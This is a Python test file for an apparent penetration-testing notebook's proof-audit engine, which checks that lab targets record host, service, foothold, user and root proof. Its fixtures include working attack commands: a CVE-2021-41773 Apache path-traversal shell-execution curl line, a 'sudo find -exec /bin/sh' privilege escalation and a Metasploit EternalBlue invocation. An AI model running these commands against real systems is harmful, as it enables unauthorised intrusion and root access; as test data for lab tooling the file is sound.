"""Tests for Proof Invariant Completeness Audit Engine (P2).

Verifies the operational proof chain:
    Host -> Service -> Foothold -> User Proof -> Root Proof
"""

from cyb0x_s.audit import AuditStatus, audit_target, audit_workspace
from cyb0x_s.db.store import NotebookStore


def test_empty_target_proof_audit(store: NotebookStore) -> None:
    t = store.add_target("10.10.10.100", hostname="bare-metal", os_name="Unknown")
    report = audit_target(store, t.id)

    assert report is not None
    assert report.ip == "10.10.10.100"
    assert report.is_complete is False
    assert report.completion_percentage < 30.0

    # Checks should flag missing items
    stages = {c.stage for c in report.checks}
    assert "Host" in stages
    assert "Service" in stages
    assert "Foothold" in stages
    assert "User" in stages
    assert "Root" in stages

    # Critical proofs missing should generate pre-reset warnings
    assert len(report.missing_critical_proofs) >= 4
    assert len(report.pre_reset_warnings) >= 1
    assert any("FOOTHOLD" in w for w in report.pre_reset_warnings)


def test_completed_target_proof_audit(store: NotebookStore) -> None:
    t = store.add_target("10.10.10.101", hostname="fully-pwned", os_name="Linux")
    store.add_service(target_id=t.id, port=80, service="HTTP", version="Apache 2.4.49")
    store.add_service(target_id=t.id, port=22, service="SSH", version="OpenSSH 8.2")

    # Foothold info
    store.update_target_details(
        target_id=t.id,
        initial_access_vuln="CVE-2021-41773 Apache Path Traversal",
        foothold_cmd="curl -s --path-as-is http://10.10.10.101/cgi-bin/.%2e/.%2e/bin/sh -d 'echo; id'",
        foothold_context="www-data (uid=33)",
        user_flag="FLAG{user_level_access_verified}",
        privesc_vector="sudo /usr/bin/find NOPASSWD",
        root_proof="uid=0(root) gid=0(root) groups=0(root) ip=10.10.10.101",
        root_flag="FLAG{system_root_access_verified}",
    )
    store.add_command(
        command="sudo find . -exec /bin/sh \\; -quit",
        target_id=t.id,
        is_golden=True,
        step="privesc",
    )

    report = audit_target(store, t.id)
    assert report is not None
    assert report.is_complete is True
    assert report.completion_percentage == 100.0
    assert len(report.missing_critical_proofs) == 0
    assert len(report.pre_reset_warnings) == 0

    # Every check is satisfied
    for c in report.checks:
        assert c.status == AuditStatus.SATISFIED


def test_workspace_proof_audit(store: NotebookStore) -> None:
    # Target 1: incomplete
    t1 = store.add_target("10.10.10.102", hostname="box-one", os_name="Linux")
    store.add_service(target_id=t1.id, port=80, service="HTTP")

    # Target 2: fully completed
    t2 = store.add_target("10.10.10.103", hostname="box-two", os_name="Windows")
    store.add_service(target_id=t2.id, port=445, service="SMB")
    store.update_target_details(
        target_id=t2.id,
        initial_access_vuln="MS17-010 EternalBlue",
        foothold_cmd="msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue...'",
        foothold_context="NT AUTHORITY\\SYSTEM",
        user_flag="FLAG{eternalblue_nt_auth}",
        privesc_vector="Already SYSTEM via initial kernel exploit",
        root_proof="whoami -> nt authority\\system",
        root_flag="FLAG{root_system_pwned}",
    )

    ws_audit = audit_workspace(store)
    assert ws_audit.total_targets == 2
    assert ws_audit.complete_targets == 1
    assert 40.0 <= ws_audit.overall_readiness_pct <= 90.0
